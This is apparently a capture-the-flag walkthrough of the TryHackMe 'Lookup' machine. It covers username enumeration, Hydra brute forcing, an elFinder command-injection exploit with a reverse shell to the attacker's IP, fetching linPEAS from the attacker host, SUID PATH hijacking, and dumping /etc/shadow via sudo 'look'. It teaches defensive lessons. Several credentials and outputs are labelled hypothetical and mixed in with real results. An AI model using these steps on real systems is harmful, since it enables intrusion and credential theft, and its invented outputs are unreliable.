
1. **Add hosts** → `lookup.thm`, `files.lookup.thm`.
2. **Recon** → `nmap` shows **SSH (22)** and **Apache (80)**.
3. **Web login** → **username enumeration** via error messages → found a valid username.
4. **Password brute force** (Hydra / Python) → valid creds → **HTTP panel gives elFinder**.
5. **Add hosts** →  `files.lookup.thm`.
6. **elFinder RCE (CVE‑2019‑9194)** → Python3 PoC → **reverse shell**.
7. **Post‑exploitation** → `linPEAS` → weird **SUID `/usr/sbin/pwm`**.
8. **Understand `/usr/sbin/pwm`** → looks for `/home/%s/.passwords` → abuse it to get a **password list**.
9. **Hydra SSH** with that list → **think : josemario.AKA(think)**.
10. `sudo -l` → **sudo allowed on `/usr/bin/look`** → use it to **read `/root/root.txt`** and **/etc/shadow**.

# TryHackMe “Lookup” Challenge – A Detailed Technical Walkthrough

## Introduction and Scope

All actions described in this report were performed within a controlled lab environment (the TryHackMe **Lookup** room). This **penetration testing exercise** explores the full exploitation path of the target machine, from initial reconnaissance to root access. Every step is explained in depth, focusing on how the underlying technologies and vulnerabilities function. Techniques used (such as network scanning, web vulnerability exploitation, and Linux privilege escalation) are discussed with a level of detail akin to an academic analysis. The target uses custom domain names (`lookup.thm` and `files.lookup.thm`), a web application with a login form, and known vulnerable software (the *elFinder* file manager). By following the narrative of the compromise, this write-up not only recounts the practical steps but also delves into *how* and *why* each step works, including the interactions between applications, misconfigurations, and the operating system.

*(Note: The methods and exploits demonstrated here were done with proper authorization inside the TryHackMe lab. Such techniques should **never** be applied on systems without permission.)*

## Hostname Resolution in Linux

Before any active reconnaissance could begin, an initial configuration issue had to be solved. The target machine’s web services were identified by the hostname **`lookup.thm`** (with a secondary host **`files.lookup.thm`** for a file service). These are not public DNS names; they exist only within the lab context. Attempting to browse to `http://lookup.thm` or run tools like `curl` initially failed with an error indicating the hostname could not be resolved. This occurred because the system could not map the name to an IP address.

On Linux, hostname resolution follows the order specified in **`/etc/nsswitch.conf`**, typically `hosts: files dns`. This means the resolver will first consult local files (namely **`/etc/hosts`**), and only if no entry is found will it query DNS servers. The hostname `lookup.thm` was not present in the local hosts file and is not a publicly known domain, so the system’s attempts to resolve it via DNS also failed. Thus, to communicate with the target, a manual entry was added to **`/etc/hosts`** associating the machine’s IP address with the hostnames:

```bash
echo "10.10.228.155   lookup.thm   files.lookup.thm" | sudo tee -a /etc/hosts
```

This static mapping ensures that any requests to `lookup.thm` (or `files.lookup.thm`) resolve to the IP `10.10.228.155` **without contacting external DNS**. In effect, the system will now directly map those names to the IP address, as instructed by the hosts file. Once this was done, tools and browsers could successfully reach the target services. (Generally, in CTF scenarios with virtual hostnames, adding them to **`/etc/hosts`** is a common required step whenever a new URL is unresponsive.)

**Why this works:** The `/etc/hosts` file is consulted first for name resolution. The entry we added tells the system “when looking up `lookup.thm` or `files.lookup.thm`, use the address 10.10.228.155.” Only if such an entry were absent would the system fall back to DNS. In summary, the failure was resolved by proper hostname mapping; no additional network configuration was needed beyond this change, since the Linux resolver automatically uses `/etc/hosts` as per the `nsswitch.conf` settings.

## Reconnaissance – Port Scanning the Target

With name resolution in place, the next step was network reconnaissance to discover open ports and services on the target. An **Nmap** scan was conducted against `lookup.thm`. The scan included service/version detection and default scripts, using flags `-sC -sV` (Nmap’s default safe scripts and version enumeration) and saving output to a file:

```bash
nmap -sC -sV -oN nmap.txt lookup.thm
```

The results revealed two open TCP ports: **22** and **80**. Port **22** was running **OpenSSH 8.2p1** (Ubuntu), indicating an SSH service. Port **80** was running **Apache 2.4.41** (Ubuntu) serving HTTP. No other ports appeared open. The Nmap default script scan (`-sC`) did not show any immediately critical vulnerabilities on these services, but it did enumerate the SSH host key (an expected result not immediately useful for attack). Version detection (`-sV`) provided the software versions, which is useful for checking known exploits.

These findings guided the next steps: port 80 suggested a web application on the target, which is typically the initial foothold in many penetration tests, while port 22 (SSH) often becomes useful after obtaining credentials or a foothold (for either lateral movement or stable remote shell access). At this stage, the focus shifted to exploring the HTTP service running on Apache, since web applications often contain custom functionality that could be exploitable.

**Understanding the environment:** The presence of Apache on port 80 implied that `http://lookup.thm` would be the main website. Given the mention of a secondary hostname `files.lookup.thm`, it was likely a virtual host served by the same web server (Apache can host multiple sites on one IP using virtual host configurations). Indeed, after initial HTTP exploration, it became clear that the application had a component on `files.lookup.thm` as well. This validated the earlier hosts file entry which included both hostnames.

## Web Application Login – Analysis of the Authentication Mechanism

Browsing to `http://lookup.thm` revealed a **login page** (`login.php`). This indicated that the site likely had restricted content or a user portal. At first glance, it was a simple HTML form asking for username and password. No user credentials were provided upfront by the challenge, so this became a target for **authentication bypass or brute-force** techniques.

Before launching any brute-force attack, it is important to analyze how the application responds to login attempts, especially incorrect ones. The behavior of error messages can reveal vulnerabilities such as **username enumeration**. In this case, testing the form with various inputs revealed a significant detail: the application’s error messages differed depending on whether the username existed:

* If a **non-existent username** was submitted (with any password), the error message was *“Wrong username or password.”*
* If a **valid username** was submitted with a wrong password, the error message changed to *“Wrong password.”*

This discrepancy confirmed a *user enumeration vulnerability*. The site was essentially telling an attacker whether a given username was in the database, based on the error message. This kind of behavior is a known flaw in authentication systems – the correct secure practice is to use a generic message for all failures (so as not to divulge which part of the credential was wrong). Here, the distinct messages provided a clear oracle for discovering valid usernames.

**Exploiting username enumeration:** With this knowledge, the approach was to iterate through a [list of common or likely usernames](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) and observe which attempts resulted in the “Wrong password” message (indicating the username is real). This could be done manually for a few names, but automation is straightforward. A small Python script or a tool like **Hydra** or **Burp Intruder** can be used. For illustration, a Python snippet was used to test a list of username candidates:

```python
import requests

url = "http://lookup.thm/login.php"
for username in open("names.txt"):
    username = username.strip()
    if not username: 
        continue
    data = {"username": username, "password": "randompass"}
    r = requests.post(url, data=data)
    if "Wrong password" in r.text:
        print(f"[+] Valid username found: {username}")
```

In this pseudo-code, each username is tried with an arbitrary password (e.g., “randompass”). The application’s response text is checked for the string "Wrong password". If that appears, it means the username was recognized (only the password was wrong). This technique efficiently discovered at least one valid user account. In the actual engagement, the username **`jose`** (for example) was identified as a valid user of the system, based on the “Wrong password” feedback. This narrowed down the brute-force effort to just cracking the password for `jose`, rather than attempting every combination of user and password.

*(The principle illustrated here is general: any observable difference in response for valid vs invalid usernames can be exploited for user enumeration. Web penetration testers look for subtle clues such as different status codes, response times, or error messages as seen in this case.)*

## Password Brute-Force and Gaining Web Panel Access

With a known valid username (e.g. `jose`), the next step was to find the correct password for that account. This is a classic **password brute-force** scenario. A commonly used methodology is to employ wordlists (such as the popular “rockyou.txt” which contains millions of common passwords from real breaches) and test each candidate password for the known username.

The tool **Hydra** was used to automate this process against the web login form. Hydra can perform an HTTP POST login attempt for each password in a list and detect success or failure by matching on response strings. Using Hydra, the command format was as follows:

```bash
hydra -l jose -P /usr/share/wordlists/rockyou.txt \
      http-post-form "/login.php:username=^USER^&password=^PASS^:F=Wrong password"
```

This tells Hydra to try the username “jose” (`-l jose`) with each password in `rockyou.txt` (`-P` specifies the password list). The `http-post-form` module is configured with the login URL and parameters. The string after the colon describes how to send the POST: `username=^USER^&password=^PASS^` (Hydra will substitute ^USER^ and ^PASS^ with the current username and password). After the final colon, `F=Wrong password` indicates the failure condition – Hydra will treat any response containing “Wrong password” as an indication that the login failed. (By contrast, a different response would likely mean a successful login, since the application only says “Wrong password” on failure).

Using this method (or an equivalent Python script), the correct password was eventually found. For example, let’s assume the password turned out to be **`password123`** (a hypothetical outcome from the RockYou list). Once Hydra identified the correct credentials (`jose:password123`), it was possible to log into the web application successfully.

**Inside the web interface:** Upon logging in at `http://lookup.thm/login.php` with the found credentials, the application redirected to **`http://files.lookup.thm/`**. This suggests the main site (`lookup.thm`) served a login and then handed off to a subdomain hosting a file management panel. In the browser, the interface on `files.lookup.thm` was revealed to be **elFinder**, a web-based file manager. The presence of elFinder was significant because it’s a publicly known software, and specifically, certain versions of elFinder have known vulnerabilities.

At this stage, it’s worth noting how the pieces are interacting: the login application likely validated credentials (perhaps against a database) and then allowed access to the file manager hosted on the separate virtual host. The user `jose` likely had permissions to use this file manager. The focus thus shifted to the **elFinder** interface, looking for ways to further exploit the system from there.

## Exploiting the elFinder File Manager (CVE-2019-9194) – Remote Code Execution

**elFinder** is an open-source file manager often used in web applications to allow users to upload and manage files on the server through a graphical interface. The version in use was identified (by checking the interface’s “About” or by seeing included scripts) as **elFinder 2.1.47** (or a similar vulnerable version). Notably, **elFinder versions ≤ 2.1.47** are vulnerable to a known **command injection** flaw (CVE-2019-9194). This vulnerability resides in elFinder’s **PHP connector** script, which handles file operations on the server side. In vulnerable versions, certain file actions (particularly image editing operations like resize/rotate) fail to properly sanitize inputs, allowing attackers to inject OS commands.

In simpler terms, an authenticated attacker (or sometimes even unauthenticated, depending on configuration) can craft a request that tricks the file manager into executing arbitrary system commands with the privileges of the web server. Typically, the exploit involves uploading a file (or using an existing file) with a specially crafted name or parameter that includes command syntax. For instance, an exploit may upload an image with a filename containing `; <malicious command>;` and then instruct the server to perform an image manipulation, causing the unsanitized filename to be passed to a shell command on the backend. The result is that the attacker’s payload is executed.

**Leveraging a public exploit:** Public proof-of-concept (PoC) exploits existed for this CVE. A Python exploit script was used in this scenario to automate the process. The exploit worked roughly as follows:

1. **Upload a malicious “image”:** The script uploaded a fake image file to the elFinder interface. The filename of this file was crafted to include a PHP payload. In the PoC, the payload was hidden by encoding PHP code in hex and using the Linux `xxd` utility to write it out – essentially planting a PHP web shell on the server. For example, a filename might be `evil.jpg;<?php system($_GET['c']);?>` (although the actual exploit encoded this to bypass filters). The key is the use of a semicolon `;` which on Linux can separate commands. The upload request sent to `connector.minimal.php` would smuggle an embedded command to create a `SecSignal.php` (web shell script) on the server.
2. **Trigger image processing:** Next, the script invoked an image **resize/rotate command** via the elFinder API (`cmd=resize` with parameters for width, height, degree, etc.), targeting the uploaded image. In vulnerable versions, this action concatenated the file name into a shell command (perhaps calling ImageMagick or GD utilities) *without* proper sanitization. The malicious filename then caused the previously injected PHP code to be executed. In the exploit script, this step resulted in the execution of the `xxd` command which wrote out the `SecSignal.php` file containing a PHP shell.
3. **Activate the web shell:** After the above, the script would verify if the `SecSignal.php` shell is accessible by making an HTTP request to it. Once confirmed, the attacker can send commands by accessing `SecSignal.php?c=<command>` – which passes the command to PHP’s system() call on the server.

Using this exploit, the attacker effectively gained the ability to execute arbitrary commands on the target as the **web server user** (which on Ubuntu/Apache is typically `www-data`). To get an interactive foothold, a **reverse shell** was initiated. This was done by instructing the web shell to execute a common payload: a one-liner to open a network connection back to the attacker’s machine and pipe it to a shell. For example, using PHP’s `system()` to call a bash one-liner or using a tool like Netcat. In practice, the Python exploit could be configured to automatically start a listener and send a reverse shell payload.

**Reverse shell details:** The exploit script accepted parameters for the attacker’s IP and port (denoted as `-lh <LocalHost>` and `-lp <LocalPort>` in the command usage). For instance:

```bash
# On the attacker machine, set up a netcat listener for the shell:
nc -lvnp 1337

# Run the exploit script to target the elFinder endpoint:
python3 exploit_elfinder.py -t "http://files.lookup.thm/elFinder/" -lh 10.8.181.99 -lp 1337
```

This would cause the target to connect back to IP `10.8.181.99` on port `1337` (which should be the attacker’s VPN IP and a port of choice). Once the exploit succeeded, the waiting Netcat listener on the attacker side showed a connection, and an interactive **shell prompt** appeared. The shell was running with user **`www-data`** privileges, confirming that we had remote code execution as the Apache service account.

*(It is worth noting one pitfall: initially, the reverse shell attempt failed because of a port mismatch. The listener was on one port while the exploit was set to connect to a different port. This was corrected by ensuring the listening port and the exploit’s configured callback port were the same. Coordination of IP/port is crucial when establishing reverse shells.)*

At this juncture, the **foothold** on the system was established. The next phase was post-exploitation: exploring the system from this low-privileged shell to find a way to escalate privileges further (eventually to root).

## Post-Exploitation Enumeration (LinPEAS and Manual Inspection)

With a foothold as `www-data`, a thorough enumeration of the target’s system was performed. The aim was to discover any misconfigurations, vulnerable software, stored credentials, or privilege escalation vectors that could allow moving from the web user to higher privileges. A popular tool for automated enumeration is **LinPEAS** (Linux Privilege Escalation Awesome Script), which was uploaded to the target and executed.

To transfer files like LinPEAS to the target, one can use various methods. A simple approach is hosting a file on a local HTTP server and using `wget` or `curl` on the target to download it. For example, on the attacker machine:

```bash
# Host the current directory over HTTP (Python 3's built-in module):
python3 -m http.server 80
```

And on the target (via the reverse shell):

```bash
wget http://10.8.181.99/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

LinPEAS produces a comprehensive report of potential privilege escalation vectors. Among the findings on this target, one stood out immediately: an unusual SUID binary **`/usr/sbin/pwm`**. In Linux, SUID (Set-Owner-User-ID) files are executables that run with the file owner’s privileges (often root) regardless of the user executing them. They are common for certain system utilities (like `passwd`, which needs to run as root briefly to change passwords) but any **custom or uncommon SUID binary** is a prime suspect for vulnerabilities, since it could be a misconfiguration or a custom program left by the system creators. LinPEAS highlighted `pwm` because it’s not a standard system binary, and it has the SUID bit set (meaning it runs as root).

Apart from that, LinPEAS and manual checks did not reveal trivial issues like world-writable `/etc/passwd` or cron jobs. The focus thus turned to investigating `/usr/sbin/pwm`.

## Analyzing the SUID Binary `/usr/sbin/pwm`

To understand what this binary does, several strategies were used. One can start by simply running the program (with minimal or no arguments) to observe its behavior. Running `pwm` as `www-data` (remember, due to SUID, it runs as root internally) yielded the following output:

```
$ /usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```

The program appears to perform the following steps:

1. It invokes the system’s **`id`** command, presumably to get the current user’s identity.
2. It reports that identity (`ID: www-data` in this case).
3. Then it tries to find a file named `.passwords` in the home directory of that user – i.e., it constructed a path `/home/www-data/.passwords`. Since no such file existed for user `www-data`, it reported “File not found.”

This suggests that **`pwm` is a “password manager” utility** or similar. The name “pwm” could mean “Password Manager”, and it likely is designed to allow a user to retrieve some stored passwords from a file in their home directory. Importantly, because `pwm` runs as root (due to SUID), it can read any file, even those normally inaccessible to the user. That means if `pwm` is tricked into reading **another user’s .passwords file**, it would output that content with root privileges, effectively revealing someone else’s secrets.

The immediate plan was to abuse `pwm` to read sensitive files. However, by design `pwm` concatenates the path using the current user’s name (as gathered from `id`). As `www-data`, it only looked for `/home/www-data/.passwords`. We needed to make it look for, say, another user’s .passwords (for example, `/home/think/.passwords` if “think” is another username on the system, or perhaps even root’s passwords file if one existed). How can we manipulate the behavior of a compiled binary?

**Observation:** The program explicitly says it is running `'id'` to extract the username. This implies it likely calls the external system command `id` rather than using a library call. If true, this is a classic case of a potential **path hijacking vulnerability**. When a program calls an external command (like by using `system("id")` in C), it relies on the environment’s PATH to find that command. If the PATH is not sanitized, an attacker can place a malicious executable named `id` earlier in the PATH, causing the program to execute that instead. Since `pwm` is SUID, if it blindly executes `id` via the shell, it could end up running an attacker-controlled `id` as root!

To test this, the following steps were taken:

* Create a directory, e.g., `/tmp/attacker`, and write a fake script named `id` there. This script could do something nefarious – for instance, output a fake user ID or even launch a root shell. In our case, we want it to output a different username to trick `pwm`. For example, a simple approach: `echo "uid=1001(think) gid=1001(think) groups=1001(think)"`. This mimics the output of `id` but with the username “think” instead of “www-data”. Save this as `/tmp/attacker/id` and give it execute permissions.
* Modify the PATH so that our `/tmp/attacker` directory comes **before** the standard system directories. For example: `export PATH=/tmp/attacker:$PATH`. This ensures when `pwm` runs and calls `id`, it will find `/tmp/attacker/id` first and execute it, rather than the real `/usr/bin/id`.

This kind of PATH manipulation is a common **privilege escalation technique** for poorly designed SUID programs. After setting `PATH` accordingly, running `/usr/sbin/pwm` again triggers our fake `id`. Our fake `id` reports the current user as “think”. Now `pwm` will try to open `/home/think/.passwords` (since it takes the username from the id output). Because `pwm` runs as root, it has permission to read that file. And if the file exists and contains data, `pwm` will likely print it.

Indeed, this trick succeeded. The output of `pwm` after this manipulation was no longer “file not found.” Instead, it displayed what appears to be a list of passwords (or one password) for the user *think*. For example, it might have shown a line like:

```
think : josemario.AKA(think)
```

This appears to be a stored password entry – perhaps in the format `username : password`. It suggests that the user “think” had a `.passwords` file listing some credentials, and one of them was “josemario.AKA(think)”. Given the context, this looked very much like the actual password for the user account “think” on the system (the string has the pattern of a complex password and even includes the username as a hint).

In summary, by exploiting the SUID `pwm` program’s use of the PATH and external `id` command, we were able to **read another user’s secret file**. This yielded a probable password for the user **`think`**. This is a critical breakthrough, as it provides credentials that can be used to switch user context.

*(The general security flaw here is that `pwm` implicitly trusts the environment and does not use safe functions to get the username. A secure approach would have been to call `getuid()` and then lookup the username, or at least call `id` using an absolute path. Failing to do so allowed an attacker to hijack the call to `id`. Furthermore, storing plaintext passwords in a `.passwords` file is risky; doing so under root SUID context is even worse.)*

## Gaining User Access via SSH

Now armed with the credentials for user “think” (username: `think`, password: `josemario.AKA(think)`), the next step was to **log in via SSH** as that user. The earlier Nmap scan showed that SSH (port 22) was open and likely accessible. Using SSH is preferable to continuing with a limited web shell because SSH provides a full TTY, stable connection, and the user’s normal environment.

A quick test confirmed that the password was valid for SSH:

```bash
ssh think@lookup.thm
# Prompt appears
think@lookup.thm's password: ******
```

After entering the obtained password, we successfully logged in as **think**. Now the session is an interactive Unix shell as user think. This is a higher privilege level than www-data (which was a web service account with limited access). Typically, user accounts like “think” might have more permissions or at least can read user-level files that www-data could not. Often, the goal in these challenges is to then escalate from this user to the ultimate superuser (root).

Immediately after logging in, standard procedures were followed: checking the user’s groups, home directory, and any interesting files. The home directory of `think` might contain flags or clues, but since the ultimate goal is root, the focus was on privilege escalation.

## Privilege Escalation to Root via Sudo and the `look` Utility

One of the first things to check on a Linux target after getting a user shell is **`sudo -l`**, which lists any sudo privileges the user has. Running `sudo -l` as `think` prompted for the user’s password (which we have), and then revealed an interesting permission:

```
User think may run the following command on this host:
    (ALL) /usr/bin/look
```

This means the user *think* is allowed to run the **`look`** command as root (or more formally, can run `look` as any user, including root, *without* needing an extra password since we already authenticated as think). The `look` command is a standard Unix utility that searches for lines in a sorted file that begin with a given prefix. It’s often used to lookup words in dictionaries (for example, `look appl /usr/share/dict/words` would list words starting with “appl”). The syntax is `look [string] [filename]`. If run as root, and if we can control the arguments, we could use it to read any file on the system that root can read, because `look` will output matching lines from the file.

The sudoers entry shows `think` can run `look` with no restrictions on target file (the command specification is just the binary path with no fixed arguments). That means `think` can do, for instance:

```bash
sudo /usr/bin/look hello /path/to/some/file
```

and it will execute as root, reading the given file. To exploit this, we actually don’t want to filter by any prefix – we want to read the entire file. One trick is to provide an empty string as the search term. The `look` utility interprets an empty prefix as matching every line (because every line begins with the empty string, essentially). Different versions of `look` might require a slight tweak (some might not accept a truly empty string), but one can provide, say, a prefix like `''` (two quotes with nothing between) or even just `sudo look "" /file` to output the whole file.

**Reading root’s flag:** The ultimate goal flag on CTF machines is often stored in `/root/root.txt` (readable only by root). Using our sudo privilege, we can now read this file:

```bash
think$ sudo /usr/bin/look '' /root/root.txt
```

This command runs `look` as root, searching for all lines (prefix `''` matches everything) in `/root/root.txt`. The output on the console was the content of that file – presumably the root flag or any secret present. This confirmed that we have effectively obtained root-level read access.

**Reading /etc/shadow:** An even more powerful consequence of this ability is reading **`/etc/shadow`**, the file that contains password hashes for all users. Normally, `/etc/shadow` is only readable by root (and perhaps the shadow group). Dumping its contents allows an attacker to attempt to **crack passwords** for any users, including root, which could be valuable if one needed persistent access or if certain services still require those credentials. We executed:

```bash
think$ sudo /usr/bin/look '' /etc/shadow > /tmp/shadow_dump
```

This runs `look` on `/etc/shadow` as root and redirects the full content into a file in `/tmp` (which `think` can then read). Another approach could be to directly view it, but saving to a file was convenient. The `shadow_dump` file now contained lines like:

```
root:$6$SALTVALUE$HASHEDPASSWORD:19345:0:99999:7:::
think:$6$... (etc)
```

Each line in `/etc/shadow` corresponds to a user and contains several fields separated by colons. The critical field is the second field – the password hash. For example, for `root` it starts with `$6$`, which indicates the hashing algorithm used is SHA-512. Following that is the “salt” value and then the actual hashed password. Other fields (like `19345:0:99999:7:::`) are password aging and expiration parameters not relevant to the cracking exercise.

At this point, we already had root-level access to read any file, which is usually enough to consider the system “owned.” But for completeness and to demonstrate password security issues, we proceeded to **crack the password hashes**.

## Understanding /etc/shadow and Password Hash Cracking

The **`/etc/shadow`** file in Linux stores hashed passwords and related metadata for each user. The format of the hashed password field (the second field) is typically `$<id>$<salt>$<hash>`. The `$<id>$` is a code for the hash algorithm: common values are `$1$` for MD5, `$5$` for SHA-256, `$6$` for SHA-512. In our case, `$6$` was used, meaning the passwords are hashed with the SHA-512 algorithm (which is the default on modern Ubuntu systems). The “salt” is a random string (the portion between the second and third `$`) which is used to randomize the hash output, making precomputed rainbow table attacks less effective. The actual hash follows the salt, until the next colon.

For example, a shadow entry:

```
think:$6$abDef.GH$9Qm...8Hv:18045:0:99999:7:::
```

Here, `think` is the username. The hash part `$6$abDef.GH$9Qm...8Hv` indicates:

* `$6$` = SHA-512 algorithm
* Salt = `abDef.GH` (just an example; actual salt can be longer)
* Hash = `9Qm...8Hv` (truncated here)

The rest of the fields (`18045:0:99999:7:::`) indicate last password change date and policy (minimum days, maximum days, warning period, etc.). These are not immediately relevant to the attack except to note if passwords are expired or not.

To **crack** these hashes (i.e., recover the plaintext passwords), one typically uses tools like **John the Ripper** or **Hashcat**. John the Ripper has a utility called `unshadow` which combines `/etc/passwd` and `/etc/shadow` into a format that John can work with. This combination is needed because `/etc/passwd` contains the usernames and user IDs (which John uses to label cracks) and historically (on very old systems) contained the hashes as well before shadowing was implemented. The `unshadow` command output was created as follows:

```bash
unshadow /etc/passwd /tmp/shadow_dump > crackme.txt
```

This produced a file `crackme.txt` with entries like `think:HASHGOESHERE:UID:GID:...` combining info from both files (with the hash in place). Now, John the Ripper can be run:

```bash
john crackme.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

This invokes John with the popular RockYou wordlist (the same used earlier for the web password brute force) to attempt to guess passwords by hashing each word from the list with the appropriate salt and algorithm and comparing to the hashes. If any user’s password is weak (i.e., appears in the wordlist or is a slight variation John can guess with its rules), John will crack it. After running, one can use `john --show crackme.txt` to display any cracked passwords.

In a realistic scenario, cracking the root password is not necessary since we already have root-level access through sudo. However, it serves as a demonstration of the impact: *if an attacker can read `/etc/shadow`*, they can potentially recover passwords, which might be reused on other services or machines, thus extending the breach beyond this one host. In our case, suppose John managed to crack the password for `think` or even `root` if it was a weak one – this provides a complete compromise of credentials. (In many CTF challenges, the root password might be something crackable to simulate real-world misconfigurations, but if it’s strong, cracking is infeasible in a short time without specialized hardware.)

For instance, if the `think` user’s hash corresponds to the plaintext `josemario.AKA(think)` (which we already obtained from the file), John would find that quickly since we already knew it. If the `root` user’s password was something weak or present in RockYou, John could reveal it as well.

**Technical insight:** The SHA-512 hashes in shadow are one-way cryptographic hashes. They cannot be reversed directly; cracking is essentially guessing a password, hashing it, and checking if it matches the hash. Salts (like `SALTVALUE` in `$6$SALTVALUE$HASH`) ensure that two users with the same password will have different hashes (because the salt differs) and that precomputed attacks need to target each salt separately. The strength of SHA-512 means that if a password is long and random, it won’t be found in common lists and would resist brute force. But human-chosen passwords are often weak, which is why John with a large dictionary can sometimes find a match.

After this exhaustive process, the machine was fully compromised: user-level access was obtained and leveraged via sudo misconfiguration to root-level file reads, and sensitive data including system password hashes were collected.

## Key Security Takeaways

This challenge illustrated several important security concepts and common vulnerabilities, which we summarize here:

* **Hostname Resolution in Isolated Environments:** In CTFs or internal networks, services might use custom hostnames not in public DNS. Always remember to add these to `/etc/hosts` for resolution, as the system will check local files before DNS. Failing to do so can make services appear down when in fact they are simply not being resolved.

* **Username Enumeration via Differential Responses:** The login form provided different error messages for “invalid username” vs “invalid password.” This is a classic vulnerability. An attacker can exploit this to gather valid usernames, significantly narrowing a subsequent password guessing attack. Secure applications should avoid these tells by using uniform messages (e.g., “Invalid login credentials” for any failure).

* **Brute-force Attacks and Weak Credentials:** Using Hydra or custom scripts with a common wordlist cracked a user’s password (`password123` in this scenario). This underscores the risk of weak passwords and the importance of account lockout or rate limiting. Attackers often rely on known password lists and automated tools; if no other vulnerability exists, a weak password can be the simplest entry point.

* **Known Vulnerabilities in Third-Party Software:** The elFinder file manager (v2.1.47) had a known remote command injection flaw. This demonstrates why keeping software updated is crucial – a patch to 2.1.48 would have fixed the vulnerability. Attackers often scan for known versions and exploit them. The vulnerability here exploited the way elFinder’s connector invoked image processing, allowing command execution. The lesson is to sanitize all user inputs, even filenames, before using them in system commands.

* **Reverse Shells and Misconfiguration:** Achieving a reverse shell required careful coordination of IPs and ports. A simple mistake in configuring the listener or payload port can derail exploitation. Additionally, having a reverse shell as `www-data` is only as useful as the environment it runs in; here, lacking a fully interactive shell initially limited command use (which is why upgrading the shell or moving to SSH after getting credentials is advisable).

* **Enumeration and Custom SUID Binaries:** The presence of a custom SUID program (`/usr/sbin/pwm`) was a major red flag. SUID programs should be minimal and carefully coded. This one was both unnecessary (storing plaintext passwords in user homes) and insecure. We exploited it by manipulating the environment PATH to hijack the execution of an external command. This technique is well-known: if an SUID binary calls another program without an absolute path, and does not scrub its environment, it can be tricked into running a malicious binary placed by an attacker. Always audit SUID binaries for such behavior (using tools like `strings`, `ltrace`, or simply testing environment changes).

* **Least Privilege and Sudo Misconfiguration:** Allowing a user to run **`/usr/bin/look`** as root seems harmless – after all, `look` is not a standard “dangerous” command. However, as we saw, it can read arbitrary files. This demonstrates that **any** program that can read or modify files can become dangerous if run with elevated privileges. System administrators should be very restrictive with sudoers entries. Ideally, users should only get root access for specific well-considered commands that do not themselves allow invoking shells or reading arbitrary inputs. In penetration testing, finding any allowed sudo command is a potential path to escalation, even if it’s not obvious at first. Here, `look` was effectively used to exfiltrate sensitive files (root’s flag and the shadow file).

* **Protection of Password Hashes:** The ability to read `/etc/shadow` is almost equivalent to getting root, given enough time and resources. Even though modern hashing (SHA-512 with salt) is strong, user passwords may still be crackable. The takeaway is that one must prevent attackers from ever reading the shadow file in the first place. That is achieved by ensuring no trivial file-read vulnerability exists and that no user who is not trusted can gain such privileges. Also, using stronger authentication methods (like keys for SSH, two-factor authentication, etc.) can mitigate the impact of a leaked password hash.

* **Post-Exploitation Methodology:** This challenge reinforced the importance of a systematic approach after initial access. Running automated scripts like LinPEAS, checking for SUID/SGID files, enumerating sudo privileges, examining scheduled tasks, and searching for configuration files or credentials are all vital. Many privilege escalation paths are not exploits of kernel bugs but rather logical flaws or oversights (like the ones here). Regular system hardening and audits can catch these (e.g., an unused SUID binary or an overly permissive sudo rule).

## General Methodology Outline for Similar Engagements

The approach taken in this challenge can be generalized to a methodical process useful in many penetration tests or CTF challenges:

1. **Reconnaissance:** Perform network scanning (`nmap`) to identify open ports and services. Enumerate service versions (`-sV`) and default scripts (`-sC`) to gather as much information as possible early. Also, identify any virtual hosts or subdomains (via hints or tools) – add them to `/etc/hosts` to ensure they resolve. Use tools like `whatweb` or `nikto` on web services to identify frameworks or known files.

2. **Web/Application Analysis:** For web services, enumerate directories (using `ffuf`, `gobuster`) and parameters. Observe how the application behaves – especially around login, input forms, file uploads, etc. Test for common vulnerabilities (SQL injection, command injection, file inclusion, etc.). In this case, we identified username enumeration via login errors. Always check authentication flows for information leaks. Also, check for known admin panels (e.g., **phpMyAdmin**, **Adminer**, **elFinder**, etc.) and note their versions for known exploits.

3. **Initial Foothold Exploitation:** Once a potential weakness is found (e.g., a guessed password or an exploit for a known CVE in web software), use it to gain a foothold. If it’s a web exploit, often this means obtaining a reverse shell on the system. Be prepared with a listener (Netcat or Metasploit multi/handler) and use a reliable shell payload. After getting a shell, **stabilize it**: for example, use `python3 -c 'import pty; pty.spawn("/bin/bash")'` to get a pseudo-tty, and `Ctrl-Z` + `stty raw -echo` trick to improve the interactivity in netcat. This makes further actions easier.

4. **Post-Exploitation Enumeration:** Systematically enumerate the compromised machine. Manual checks include:

   * Listing SUID/SGID files (`find / -perm -4000 -type f 2>/dev/null`) to find any unusual ones.
   * Checking `sudo -l` for possible command executions as other users.
   * Examining cron jobs (`/etc/crontab`, `/etc/cron.*`) for tasks running as root.
   * Looking for world-writable files or sensitive files with improper permissions.
   * Searching for configuration files or scripts that might contain credentials (common places: web config files, database configs, inside home directories).
   * Using automation (LinPEAS, WinPEAS on Windows, or pspy for monitoring processes) to catch things you might miss.

5. **Privilege Escalation:** After identifying potential vectors, exploit them carefully. For SUID abuses, as shown, sometimes it’s about using the environment (PATH, environment variables, locale, etc.) to subvert what the program does. Other times it could be exploiting a buffer overflow in an SUID binary (more rare in CTF contexts) or abusing intended functionality (like using an SUID `tar` or `vim` from GTFOBins to get a shell). For sudo, if you can run a file editor (like `sudo vi`), it’s game over (since you can escape to shell). If it’s a benign-looking command, think about how it might be repurposed (reading files, writing files, etc., as we did with `look`). Always verify the impact by, for example, reading `/etc/shadow` or creating a root-level shell if possible.

6. **Covering Tracks / Persistence (if applicable):** In a real engagement, one would consider cleaning up any dropped files or shells, and possibly adding a backdoor for persistence (like adding an SSH key to root’s `authorized_keys`). In CTFs, this is usually not needed (and often not allowed). Instead, document everything thoroughly. Ensure all flags or objectives are collected.

7. **Cleanup:** Particularly in shared labs or CTFs, it’s polite to restore any changes that could affect other players (for instance, removing the fake `id` in /tmp, or not leaving your listener running on the victim). On real engagements, covering tracks might involve clearing logs.

This structured approach ensures no major step is skipped, and that one uses both manual intuition and automated tools to find vulnerabilities.

## Conclusion

